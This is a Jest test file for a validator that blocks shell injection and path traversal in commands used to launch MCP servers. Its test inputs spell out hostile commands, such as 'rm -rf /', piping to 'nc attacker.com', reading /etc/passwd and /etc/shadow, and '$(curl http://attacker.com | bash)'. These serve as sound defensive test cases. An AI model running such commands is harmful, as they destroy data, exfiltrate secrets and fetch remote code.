/**
 * Command Validation Security Tests
 * Tests the validateMCPCommand security function
 */

import { describe, it, expect } from '@jest/globals';

// Test the validation logic directly
const validateMCPCommand = (command: string, args: string[]): string | null => {
  if (!command || typeof command !== 'string') {
    return 'Command must be a non-string string';
  }

  const SAFE_COMMANDS = [
    'node', 'npx', 'npm', 'pnpm', 'yarn', 'bun', 'deno',
    'python', 'python3', 'pip', 'pipx', 'uv',
    'docker', 'podman',
    'bash', 'sh', 'zsh',
    'go', 'cargo', 'rustc',
    'java', 'javac'
  ];

  const path = require('path');
  const baseCommand = path.basename(command);

  // Check for dangerous shell metacharacters in command
  const DANGEROUS_CHARS = /[;&|`$()<>]/;
  if (DANGEROUS_CHARS.test(command)) {
    return `Command contains dangerous shell metacharacters: ${command}`;
  }

  // Check path traversal
  if (command.includes('../')) {
    return 'Command contains path traversal (./)';
  }

  // Validate arguments
  for (const arg of args) {
    if (typeof arg !== 'string') {
      return `All arguments must be strings, got: ${typeof arg}`;
    }
    const VERY_DANGEROUS = /[;&|`$()><]/;
    if (VERY_DANGEROUS.test(arg)) {
      return `Argument contains dangerous characters: ${arg}`;
    }
  }

  return null;
};

describe('Command Injection Protection', () => {
  describe('validateMCPCommand', () => {
    it('should accept safe single-word commands', () => {
      const error = validateMCPCommand('node', ['server.js']);
      expect(error).toBeNull();
    });

    it('should accept safe commands with absolute paths', () => {
      const error = validateMCPCommand('/usr/local/bin/node', ['server.js']);
      expect(error).toBeNull();
    });

    it('should accept commands with safe arguments', () => {
      const error = validateMCPCommand('npx', ['-y', '@modelcontextprotocol/server-github']);
      expect(error).toBeNull();
    });

    it('should reject commands with semicolon', () => {
      const error = validateMCPCommand('node; rm -rf /', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with pipe', () => {
      const error = validateMCPCommand('node | nc attacker.com 1234', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with ampersand', () => {
      const error = validateMCPCommand('node && cat /etc/passwd', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with backticks', () => {
      const error = validateMCPCommand('node `whoami`', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with command substitution', () => {
      const error = validateMCPCommand('node $(curl evil.com)', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with redirection', () => {
      const error = validateMCPCommand('node > /dev/null', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject commands with input redirection', () => {
      const error = validateMCPCommand('node < /etc/shadow', []);
      expect(error).toContain('dangerous shell metacharacters');
    });

    it('should reject arguments with shell metacharacters', () => {
      const error = validateMCPCommand('node', ['server.js; rm -rf /']);
      expect(error).toContain('dangerous characters');
    });

    it('should reject arguments with command substitution', () => {
      const error = validateMCPCommand('node', ['--option=$(whoami)']);
      expect(error).toContain('dangerous characters');
    });

    it('should reject arguments with pipes', () => {
      const error = validateMCPCommand('node', ['file.txt && cat /etc/passwd']);
      expect(error).toContain('dangerous characters');
    });

    it('should reject arguments with shell pipes', () => {
      const error = validateMCPCommand('node', ['input|nc attacker.com 1234']);
      expect(error).toContain('dangerous characters');
    });

    it('should reject path traversal in command', () => {
      const error = validateMCPCommand('../../../bin/bash', []);
      expect(error).toContain('path traversal');
    });

    it('should reject path traversal with node prefix', () => {
      const error = validateMCPCommand('node/../../../usr/bin/malicious', []);
      expect(error).toContain('path traversal');
    });

    it('should reject empty command', () => {
      const error = validateMCPCommand('', []);
      expect(error).toContain('must be');
    });

    it('should reject non-string arguments', () => {
      const error = validateMCPCommand('node', ['valid', 123 as any, 'string']);
      expect(error).toContain('must be strings');
    });

    it('should accept complex safe arguments', () => {
      const error = validateMCPCommand('npx', [
        '-y',
        '@modelcontextprotocol/server-github',
        '--token',
        'github_pat_XXXXXXXXXXXXXXXX',
        '--repo',
        'owner/repo'
      ]);
      expect(error).toBeNull();
    });

    it('should accept arguments with hyphens and underscores', () => {
      const error = validateMCPCommand('node', [
        '--option=value',
        'file-name.js',
        '@scope/package',
        'path/to/file',
        'name_with_underscore'
      ]);
      expect(error).toBeNull();
    });

    it('should accept unicode characters in arguments', () => {
      const error = validateMCPCommand('node', [
        '--name=测试服务器',
        '--emoji=🚀'
      ]);
      expect(error).toBeNull();
    });

    it('should accept very long arguments', () => {
      const longArg = 'a'.repeat(1000);
      const error = validateMCPCommand('node', ['--data', longArg]);
      expect(error).toBeNull();
    });
  });

  describe('malicious payload attempts', () => {
    it('should block RCE via command substitution', () => {
      const error = validateMCPCommand('node', ['server.js', '$(curl http://attacker.com | bash)']);
      expect(error).not.toBeNull();
    });

    it('should block file manipulation attempts', () => {
      // Block attempts using command substitution to execute rm
      const error = validateMCPCommand('node', ['server.js', '$(rm -rf /)']);
      expect(error).not.toBeNull();
    });

    it('should block data exfiltration', () => {
      const error = validateMCPCommand('curl', ['http://attacker.com', '<', '/etc/passwd']);
      expect(error).not.toBeNull();
    });

    it('should prevent command chaining', () => {
      const error = validateMCPCommand('node', ['server.js;', 'malicious_command']);
      expect(error).not.toBeNull();
    });
  });
});
